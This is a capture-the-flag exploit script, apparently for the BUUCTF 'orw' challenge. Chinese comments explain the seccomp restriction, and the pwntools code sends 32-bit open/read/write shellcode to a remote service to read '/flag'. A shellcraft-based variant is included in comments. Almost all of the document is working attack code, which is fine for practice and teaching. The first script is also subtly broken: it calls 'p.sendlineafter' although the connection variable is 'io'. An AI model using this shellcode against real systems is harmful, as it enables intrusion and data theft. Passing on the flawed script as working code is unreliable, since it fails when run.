#所谓orw就是仅允许有限的系统调用函数使用
#通过调用prctl函数，禁用了一些列系统函数，只留下了open，read，write可以使用
#第一次调用prctl函数 ————禁止提权
#第二次调用prctl函数 ————限制能执行的系统调用只有open，write，exit

from pwn import *
from LibcSearcher import *
context(log_level='debug',arch='i386',os='linux')
#io = process('./orw')
io = remote('node4.buuoj.cn',25094)

# 32位用int 0x80来调用，64位用syscall调用
shellcode = asm('push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80')
shellcode+=asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80')
shellcode+=asm('mov eax,0x4;mov ebx,0x1;int 0x80')
p.sendlineafter('shellcode:', shellcode)

io.interactive()

#新型用法
'''
from pwn import *

io = remote('node4.buuoj.cn',25094)

context.binary = 'orw'
elf = ELF('orw')

shellcode = shellcraft.open('/flag')
shellcode += shellcraft.read('eax','esp',100)
shellcode += shellcraft.write(1,'esp',100)
shellcode = asm(shellcode)

sleep(0.2)
io.sendline(shellcode)

io.interactive()
'''
